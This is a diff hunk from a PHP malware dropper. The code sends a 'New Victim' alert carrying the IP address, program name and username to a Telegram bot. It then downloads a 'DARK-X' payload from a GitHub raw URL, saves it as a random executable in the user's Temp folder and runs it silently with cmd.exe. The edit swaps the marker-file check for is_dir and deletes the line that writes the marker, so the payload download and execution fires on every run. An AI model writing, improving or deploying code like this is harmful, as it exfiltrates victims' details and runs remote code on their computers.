@@ -17,12 +17,11 @@
 		Request('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("😈 New Victim : \n ❖ IP Address : " . $ip . "\n ❖ Program Name : " . $progrm . "\n ❖ Username : " . get_current_user()) . "&chat_id=" . $chat_id);
 		$file = fopen("C:\Users\Public\old.txt", "w");
 	}
-	if(file_exists("C:\Users\Public\RA3D.txt") == false){
+	if(is_dir("C:\Users\Public\RA3D.txt") == false){
 		Request('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("📌 Downloading DARK-X... \n--" . get_current_user() . "--") . '&chat_id=' . $chat_id);
 		$link = "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Setup.msi";
 		$output = "C:\\Users\\" . get_current_user() . "\\AppData\\Local\\Temp\\" . rand(1,9999) . ".exe";
 		file_put_contents($output,Request($link));
-		$file = fopen("C:\Users\Public\RA3D.txt", "w");
 		exec("cmd.exe /c " . $output . " /qn");
 		Request('https://api.telegram.org/bot' . $token . '/sendMessage?text=' . urlencode("📌 DARK-X Executed \n--" . get_current_user() . "--") . '&chat_id=' . $chat_id);
 	}
